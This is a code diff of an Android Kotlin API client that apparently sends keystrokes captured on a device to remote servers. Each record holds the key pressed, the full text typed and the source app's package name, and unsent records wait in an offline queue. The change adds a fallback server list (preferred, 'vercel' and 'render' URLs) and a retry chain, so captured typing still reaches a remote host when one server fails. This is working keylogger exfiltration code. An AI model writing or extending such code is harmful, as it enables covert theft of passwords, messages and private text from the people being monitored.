@@ -20,6 +20,7 @@ import java.util.concurrent.atomic.AtomicBoolean
 class ApiClient(private val context: Context) {
     private val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
     private val defaultServerUrl = context.getString(R.string.default_server_url)
+    private val fallbackServerUrl = context.getString(R.string.fallback_server_url)
     private val offlineQueue = OfflineQueue(context)
     private val isFlushing = AtomicBoolean(false)
     private val client = OkHttpClient.Builder()
@@ -36,6 +37,13 @@ class ApiClient(private val context: Context) {
     fun getServerUrl(): String {
         return prefs.getString(KEY_SERVER_URL, null)?.takeIf { it.isNotBlank() }
             ?: defaultServerUrl
+    }
+
+    fun getCandidateServerUrls(): List<String> {
+        val preferred = normalizeUrl(getServerUrl())
+        val vercel = normalizeUrl(defaultServerUrl)
+        val render = normalizeUrl(fallbackServerUrl)
+        return linkedSetOf(preferred, vercel, render).filter { it.isNotBlank() }
     }
 
     fun saveServerUrl(url: String) {
@@ -83,7 +91,7 @@ class ApiClient(private val context: Context) {
             return
         }
 
-        postKeystroke(deviceUniqueId, keyPressed, fullText, appPackage, action) { success ->
+        postKeystrokeWithFallback(deviceUniqueId, keyPressed, fullText, appPackage, action) { success ->
             if (!success) {
                 offlineQueue.enqueue(deviceUniqueId, keyPressed, fullText, appPackage, action)
             } else {
@@ -120,7 +128,7 @@ class ApiClient(private val context: Context) {
         }
 
         val item = pending[index]
-        postKeystroke(
+        postKeystrokeWithFallback(
             deviceUniqueId = item.optString("deviceUniqueId"),
             keyPressed = item.optString("keyPressed"),
             fullText = item.optString("fullText"),
@@ -136,7 +144,58 @@ class ApiClient(private val context: Context) {
         }
     }
 
+    private fun postKeystrokeWithFallback(
+        deviceUniqueId: String,
+        keyPressed: String,
+        fullText: String,
+        appPackage: String,
+        action: String,
+        onComplete: (Boolean) -> Unit
+    ) {
+        val urls = getCandidateServerUrls()
+        tryPostKeystroke(urls, 0, deviceUniqueId, keyPressed, fullText, appPackage, action, onComplete)
+    }
+
+    private fun tryPostKeystroke(
+        urls: List<String>,
+        index: Int,
+        deviceUniqueId: String,
+        keyPressed: String,
+        fullText: String,
+        appPackage: String,
+        action: String,
+        onComplete: (Boolean) -> Unit
+    ) {
+        if (index >= urls.size) {
+            onComplete(false)
+            return
+        }
+
+        val baseUrl = urls[index]
+        postKeystroke(baseUrl, deviceUniqueId, keyPressed, fullText, appPackage, action) { success ->
+            if (success) {
+                if (baseUrl != getServerUrl()) {
+                    Log.d(TAG, "Fallback server succeeded: $baseUrl")
+                }
+                onComplete(true)
+            } else {
+                Log.w(TAG, "Server failed ($baseUrl). Trying next...")
+                tryPostKeystroke(
+                    urls,
+                    index + 1,
+                    deviceUniqueId,
+                    keyPressed,
+                    fullText,
+                    appPackage,
+                    action,
+                    onComplete
+                )
+            }
+        }
+    }
+
     private fun postKeystroke(
+        baseUrl: String,
         deviceUniqueId: String,
         keyPressed: String,
         fullText: String,
@@ -154,20 +213,20 @@ class ApiClient(private val context: Context) {
 
         val requestBody = payload.toString().toRequestBody(JSON_MEDIA_TYPE)
         val request = Request.Builder()
-            .url("${getServerUrl()}/api/keystrokes")
+            .url("$baseUrl/api/keystrokes")
             .post(requestBody)
             .build()
 
         client.newCall(request).enqueue(object : Callback {
             override fun onFailure(call: Call, e: IOException) {
-                Log.e(TAG, "Failed to record keystroke: ${e.message}")
+                Log.e(TAG, "Failed to record keystroke on $baseUrl: ${e.message}")
                 onComplete(false)
             }
 
             override fun onResponse(call: Call, response: Response) {
                 response.use {
                     if (!it.isSuccessful) {
-                        Log.e(TAG, "Server error: ${it.code}")
+                        Log.e(TAG, "Server error on $baseUrl: ${it.code}")
                     }
                     onComplete(it.isSuccessful)
                 }
